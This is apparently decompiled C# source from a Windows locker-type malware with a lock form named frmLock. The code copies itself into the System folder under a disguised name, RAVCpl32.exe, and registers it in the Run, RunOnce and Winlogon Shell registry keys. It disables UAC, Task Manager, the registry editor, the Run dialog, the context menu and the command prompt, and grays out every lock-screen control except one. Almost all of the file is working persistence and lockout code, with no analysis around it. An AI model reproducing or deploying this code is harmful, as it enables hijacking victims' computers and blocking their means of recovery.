using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;

namespace ns2;

internal class Class6
{
	public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\RAVCpl32.exe";

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetUserNameA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBuffer, ref int nSize);

	public static void smethod_0(bool AutostartEnable)
	{
		if (!File.Exists(string_0))
		{
			File.Copy(Application.get_ExecutablePath(), string_0, overwrite: true);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
		if (AutostartEnable)
		{
			registryKey.SetValue("RAVCpl32", string_0);
			registryKey2.SetValue("RAVCpl32", string_0);
			registryKey3.SetValue("RAVCpl32", string_0);
			registryKey4.SetValue("Shell", string_0);
		}
		else
		{
			registryKey.DeleteValue("RAVCpl32", throwOnMissingValue: false);
			registryKey2.DeleteValue("RAVCpl32", throwOnMissingValue: false);
			registryKey3.DeleteValue("RAVCpl32", throwOnMissingValue: false);
			registryKey4.SetValue("Shell", string_0);
		}
		registryKey.Close();
		registryKey2.Close();
		registryKey3.Close();
		registryKey4.Close();
	}

	private static string smethod_1()
	{
		Guid guid = new Guid(((GuidAttribute)((object)Class1.Forms.frmLock).GetType().Assembly.GetCustomAttributes(typeof(GuidAttribute), inherit: false)[0]).Value);
		Guid guid2 = guid;
		return guid2.ToString();
	}

	public static void smethod_2()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		registryKey.Close();
	}

	public static void smethod_3(bool disable)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (disable)
		{
			registryKey.SetValue("DisableTaskMgr", 1);
			registryKey2.SetValue("DisableTaskMgr", 1);
		}
		else
		{
			registryKey.SetValue("DisableTaskMgr", 0);
			registryKey2.SetValue("DisableTaskMgr", 0);
		}
		registryKey.Close();
	}

	public static void smethod_4(bool disable)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (disable)
		{
			registryKey.SetValue("DisableRegistryTools", 1);
			registryKey2.SetValue("DisableRegistryTools", 1);
		}
		else
		{
			registryKey.SetValue("DisableRegistryTools", 0);
			registryKey2.SetValue("DisableRegistryTools", 0);
		}
		registryKey.Close();
	}

	public static void smethod_5(bool disable)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		if (disable)
		{
			registryKey.SetValue("NoRun", 1);
			registryKey.SetValue("NoViewContextMenu", 1);
			registryKey2.SetValue("DisableCMD", 1);
			registryKey3.SetValue("NoRun", 1);
			registryKey3.SetValue("NoViewContextMenu", 1);
			registryKey4.SetValue("DisableCMD", 1);
		}
		else
		{
			registryKey.SetValue("NoRun", 0);
			registryKey.SetValue("NoViewContextMenu", 0);
			registryKey2.SetValue("DisableCMD", 0);
			registryKey3.SetValue("NoRun", 0);
			registryKey3.SetValue("NoViewContextMenu", 0);
			registryKey4.SetValue("DisableCMD", 0);
		}
		registryKey.Close();
	}

	public static void smethod_6()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((Control)Class1.Forms.frmLock).get_Controls().GetEnumerator();
			while (enumerator.MoveNext())
			{
				Control val = (Control)enumerator.Current;
				if (Operators.CompareString(val.get_Name(), ((Control)Class1.Forms.frmLock.btnExit).get_Name(), false) == 0)
				{
					val.set_Enabled(true);
				}
				else
				{
					val.set_Enabled(false);
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
